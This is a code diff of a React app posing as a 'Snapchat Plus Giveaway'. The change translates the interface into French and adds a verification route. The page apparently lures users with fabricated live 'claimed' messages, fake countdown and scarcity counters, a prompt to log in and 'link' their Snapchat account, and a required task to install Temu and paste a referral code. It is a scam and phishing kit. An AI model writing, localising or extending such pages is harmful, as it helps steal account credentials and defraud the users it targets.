@@ -1,5 +1,6 @@
 import React, { useEffect, useRef, useState } from "react";
 import LoginPage from "./LoginPage";
+import VerificationPage from "./VerificationPage";
 
 // Snapchat-themed giveaway SPA
 
@@ -34,16 +35,17 @@ type Task = {
 const tasksSeed: Task[] = [
   {
     id: "t1",
-    title: "Download the Temu app and paste this code in the search bar",
-    meta: "~3 mins • Required",
+    title:
+      "Téléchargez l'application Temu et collez ce code dans la barre de recherche",
+    meta: "~3 min • Requise",
     required: true,
     code: "527545697",
     url: "https://play.google.com/store/search?q=Temu&c=apps",
   },
   {
     id: "t2",
-    title: "Install Spark Skate and open once",
-    meta: "~2 mins • Optional",
+    title: "Installez Spark Skate et ouvrez-le une fois",
+    meta: "~2 min • Facultative",
     url: "https://play.google.com/store/search?q=Spark%20Skate&c=apps",
   },
 ];
@@ -139,7 +141,7 @@ function GiveawayPage() {
       () => {
         const n = names[Math.floor(Math.random() * names.length)];
         const masked = `${n}${Math.random().toString(36).slice(2, 5)}***`;
-        const msg = `User ${masked} just claimed Snapchat Plus!`;
+        const msg = `L'utilisateur ${masked} vient de réclamer Snapchat Plus !`;
         feedRef.current = [msg, ...feedRef.current].slice(0, 6);
         setFeed([...feedRef.current]);
       },
@@ -204,7 +206,7 @@ function GiveawayPage() {
       console.log("[DEV] submitClaim", payload);
       // simulate success
       feedRef.current = [
-        `User @${username || "anon"} claimed Snapchat Plus!`,
+        `L'utilisateur @${username || "anonyme"} vient de réclamer Snapchat Plus !`,
         ...feedRef.current,
       ].slice(0, 6);
       setFeed([...feedRef.current]);
@@ -225,7 +227,7 @@ function GiveawayPage() {
 
       if (res.ok) {
         feedRef.current = [
-          `User @${username || "anon"} claimed Snapchat Plus!`,
+          `L'utilisateur @${username || "anonyme"} vient de réclamer Snapchat Plus !`,
           ...feedRef.current,
         ].slice(0, 6);
         setFeed([...feedRef.current]);
@@ -244,17 +246,19 @@ function GiveawayPage() {
     const ok = await submitClaim();
     if (ok) {
       alert(
-        `Success! ${username || "Your account"} unlocked 1 Month Snapchat Plus.`,
+        `Succès ! ${username || "Votre compte"} a débloqué 1 mois Snapchat Plus.`,
       );
     } else {
-      alert("There was a problem claiming your reward. Please try again.");
+      alert(
+        "Un problème est survenu lors de la réclamation de votre récompense. Veuillez réessayer.",
+      );
     }
   };
 
   const steps = [
-    { id: "login", label: "Link Account", done: linked || usernameValid },
-    { id: "task", label: "Complete Task", done: !!completedTaskId },
-    { id: "claim", label: "Claim Reward", done: claimed },
+    { id: "login", label: "Lier le compte", done: linked || usernameValid },
+    { id: "task", label: "Terminer la tâche", done: !!completedTaskId },
+    { id: "claim", label: "Réclamer la récompense", done: claimed },
   ];
   const completedSteps = steps.filter((s) => s.done).length;
   const progressPct = Math.round((completedSteps / steps.length) * 100);
@@ -265,24 +269,24 @@ function GiveawayPage() {
       <div className="w-full max-w-4xl">
         {claimed && (
           <div className="mb-4 p-3 rounded-lg bg-green-50 border border-green-200 text-green-800">
-            🎉 Claimed — reward linked to @{username || "your account"}
+            🎉 Réclamé — récompense liée à @{username || "votre compte"}
           </div>
         )}
         {linked && (
           <div className="mb-4 p-3 rounded-lg bg-green-50 border border-green-200 text-green-800">
-            ✅ Welcome back, @{username || "your account"}! Your account has
-            been linked successfully.
+            ✅ Bon retour, @{username || "votre compte"} ! Votre compte a été
+            lié avec succès.
           </div>
         )}
         {!linked && (
           <div className="mb-4 flex flex-wrap items-center justify-between gap-3 rounded-2xl border border-black/10 bg-white px-4 py-3 shadow-sm">
             <div>
               <div className="text-sm font-semibold text-black">
-                Log in to link your Snapchat account
+                Connectez-vous pour lier votre compte Snapchat
               </div>
               <div className="text-xs text-gray-500">
-                After login, you’ll return here to finish the task and claim
-                the reward.
+                Après la connexion, vous reviendrez ici pour terminer la tâche
+                et réclamer la récompense.
               </div>
             </div>
             <button
@@ -295,7 +299,7 @@ function GiveawayPage() {
               }}
               className="rounded-full bg-black px-4 py-2 text-sm font-semibold text-white transition hover:opacity-90"
             >
-              Go to Login
+              Aller à la connexion
             </button>
           </div>
         )}
@@ -304,13 +308,13 @@ function GiveawayPage() {
             <GhostMark size={48} />
           </div>
           <div>
-            <h2 className="text-2xl font-bold">Snapchat Plus Giveaway</h2>
+            <h2 className="text-2xl font-bold">Concours Snapchat Plus</h2>
             <p className="text-sm text-gray-600">
-              Claim a free 1-month trial — limited time
+              Réclamez un essai gratuit de 1 mois — durée limitée
             </p>
           </div>
           <div className="ml-auto text-sm font-medium text-gray-700">
-            Offer reserved for{" "}
+            Offre réservée pour{" "}
             <span className="font-bold">{formatTime(countdown)}</span>
           </div>
         </header>
@@ -318,10 +322,11 @@ function GiveawayPage() {
         <div className="mb-6 rounded-2xl border border-yellow-300 bg-yellow-50 px-4 py-3">
           <div className="flex items-center justify-between gap-3">
             <div className="text-sm font-semibold text-black">
-              🔥 Only {rewardsLeft} free Snapchat Plus subscriptions left!
+              🔥 Plus que {rewardsLeft} abonnements gratuits Snapchat Plus
+              disponibles !
             </div>
             <div className="text-xs font-medium text-gray-500">
-              {rewardsLeft} of 100
+              {rewardsLeft} sur 100
             </div>
           </div>
           <div className="mt-2 h-2 bg-yellow-200 rounded-full overflow-hidden">
@@ -334,21 +339,21 @@ function GiveawayPage() {
 
         <main className="grid grid-cols-1 md:grid-cols-2 gap-6">
           <section className="bg-white rounded-xl p-6 shadow-md">
-            <h3 className="text-xl font-semibold mb-3">Welcome</h3>
+            <h3 className="text-xl font-semibold mb-3">Bienvenue</h3>
             <p className="text-gray-600 mb-4">
-              Complete one quick task to claim your 1 Month Snapchat Plus
-              reward.
+              Terminez une tâche rapide pour réclamer votre récompense de 1 mois
+              Snapchat Plus.
             </p>
 
             {/* <div className="mb-4">
               <label className="text-sm font-medium text-gray-700">
-                Snapchat Username
+                Nom d'utilisateur Snapchat
               </label>
               <div className="mt-2 flex items-center gap-2">
                 <input
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
-                  placeholder="e.g. cool.snap"
+                  placeholder="ex. cool.snap"
                   className="flex-1 px-4 py-2 rounded-full border border-gray-200 focus:outline-none focus:ring-2 focus:ring-yellow-400 text-sm"
                 />
                 <div className="w-8 h-8 flex items-center justify-center">
@@ -375,11 +380,11 @@ function GiveawayPage() {
                   )}
                 </div>
               </div>
-              <p className="text-xs text-gray-500 mt-1">No password required</p>
+              <p className="text-xs text-gray-500 mt-1">Mot de passe non requis</p>
             </div> */}
 
             <div className="mb-4">
-              <h4 className="font-medium mb-2">Available Tasks</h4>
+              <h4 className="font-medium mb-2">Tâches disponibles</h4>
               <div className="space-y-3">
                 {tasks.map((t) => (
                   <div
@@ -398,7 +403,7 @@ function GiveawayPage() {
                         className="text-xs px-3 py-1 rounded-full text-white"
                         style={{ background: t.required ? "#111" : "#6b7280" }}
                       >
-                        {t.required ? "Required" : "Optional"}
+                        {t.required ? "Requise" : "Facultative"}
                       </div>
                     </div>
                     {t.code && (
@@ -414,7 +419,7 @@ function GiveawayPage() {
                           onClick={() => handleCopyCode(t.code!)}
                           className={`rounded-full px-3 py-1 text-xs font-semibold transition ${copiedCode === t.code ? "bg-green-500 text-white" : "bg-black text-white hover:opacity-90"}`}
                         >
-                          {copiedCode === t.code ? "Copied!" : "Copy code"}
+                          {copiedCode === t.code ? "Copié !" : "Copier le code"}
                         </button>
                       </div>
                     )}
@@ -425,9 +430,9 @@ function GiveawayPage() {
 
             <div className="mt-4">
               <div className="mb-3 flex items-center justify-between">
-                <div className="text-sm font-semibold">Your Progress</div>
+                <div className="text-sm font-semibold">Votre progression</div>
                 <div className="text-xs font-medium text-gray-500">
-                  {completedSteps} of {steps.length} steps
+                  {completedSteps} sur {steps.length} étapes
                 </div>
               </div>
 
@@ -489,10 +494,10 @@ function GiveawayPage() {
                         </div>
                         <div className="text-[10px] text-gray-400">
                           {s.done
-                            ? "Completed"
+                            ? "Terminée"
                             : i === currentStepIndex
-                              ? "In progress"
-                              : "Pending"}
+                              ? "En cours"
+                              : "En attente"}
                         </div>
                       </div>
                     </div>
@@ -505,17 +510,17 @@ function GiveawayPage() {
                 disabled={!claimEnabled}
                 className={`mt-5 w-full px-4 py-2 rounded-full font-semibold transition ${claimEnabled ? "bg-black text-white hover:opacity-90" : "bg-gray-200 text-gray-500 cursor-not-allowed"}`}
               >
-                Claim Snapchat Plus
+                Réclamer Snapchat Plus
               </button>
             </div>
           </section>
 
           <aside className="space-y-4">
             <div className="bg-white rounded-xl p-4 shadow-md">
-              <h4 className="font-semibold mb-2">Live Activity</h4>
+              <h4 className="font-semibold mb-2">Activité en direct</h4>
               <div className="text-sm text-gray-700 space-y-2 h-28 overflow-hidden">
                 {feed.length === 0 ? (
-                  <div className="text-gray-400">No recent activity</div>
+                  <div className="text-gray-400">Aucune activité récente</div>
                 ) : (
                   feed.map((f, i) => (
                     <div key={i} className="text-xs text-gray-600">
@@ -531,41 +536,42 @@ function GiveawayPage() {
               <div className="space-y-2">
                 <details className="p-2 rounded-md bg-gray-50">
                   <summary className="font-medium cursor-pointer">
-                    How does this giveaway work?
+                    Comment fonctionne ce concours ?
                   </summary>
                   <p className="text-sm text-gray-600 mt-2">
-                    Complete one quick app task and confirm your username to
-                    receive a 1-month Snapchat Plus reward.
+                    Terminez une tâche rapide dans l'application et confirmez
+                    votre nom d'utilisateur pour recevoir une récompense de 1
+                    mois Snapchat Plus.
                   </p>
                 </details>
                 <details className="p-2 rounded-md bg-gray-50">
                   <summary className="font-medium cursor-pointer">
-                    Is this free?
+                    Est-ce gratuit ?
                   </summary>
                   <p className="text-sm text-gray-600 mt-2">
-                    Yes — the reward is a free trial. No credit card required
-                    here.
+                    Oui — la récompense est un essai gratuit. Aucune carte de
+                    crédit requise ici.
                   </p>
                 </details>
                 <details className="p-2 rounded-md bg-gray-50">
                   <summary className="font-medium cursor-pointer">
-                    How long is the offer held?
+                    Combien de temps l'offre est-elle réservée ?
                   </summary>
                   <p className="text-sm text-gray-600 mt-2">
-                    The offer is reserved for the countdown shown. It may expire
-                    if time runs out.
+                    L'offre est réservée pendant le compte à rebours affiché.
+                    Elle peut expirer si le temps s'écoule.
                   </p>
                 </details>
               </div>
             </div>
 
             <div className="bg-white rounded-xl p-4 shadow-md text-center">
-              <div className="text-sm text-gray-500">Need help?</div>
+              <div className="text-sm text-gray-500">Besoin d'aide ?</div>
               <a
                 href="#"
                 className="mt-2 inline-block px-4 py-2 rounded-full bg-yellow-400 text-black font-semibold"
               >
-                Contact Support
+                Contacter l'assistance
               </a>
             </div>
           </aside>
@@ -581,10 +587,11 @@ function GiveawayPage() {
             <div className="relative bg-white rounded-2xl p-6 max-w-md w-full shadow-2xl">
               <div className="flex flex-col items-center gap-4">
                 <GhostMark size={72} />
-                <h3 className="text-xl font-bold">🎉 Congratulations!</h3>
+                <h3 className="text-xl font-bold">🎉 Félicitations !</h3>
                 <p className="text-gray-600 text-center">
-                  You've unlocked 1 Month of Snapchat Plus! To claim your gift,
-                  login to your account and complete 1 quick task below.
+                  Vous avez débloqué 1 mois de Snapchat Plus ! Pour réclamer
+                  votre cadeau, connectez-vous à votre compte et terminez une
+                  tâche rapide ci-dessous.
                 </p>
                 <button
                   onClick={() => {
@@ -595,7 +602,7 @@ function GiveawayPage() {
                   }}
                   className="mt-2 px-6 py-2 rounded-full bg-black text-white font-semibold"
                 >
-                  Login to claim
+                  Se connecter pour réclamer
                 </button>
               </div>
             </div>
@@ -607,6 +614,11 @@ function GiveawayPage() {
 }
 
 export default function App() {
-  const isLoginRoute = window.location.pathname.startsWith("/login");
-  return isLoginRoute ? <LoginPage /> : <GiveawayPage />;
+  if (window.location.pathname.startsWith("/verification")) {
+    return <VerificationPage />;
+  }
+  if (window.location.pathname.startsWith("/login")) {
+    return <LoginPage />;
+  }
+  return <GiveawayPage />;
 }
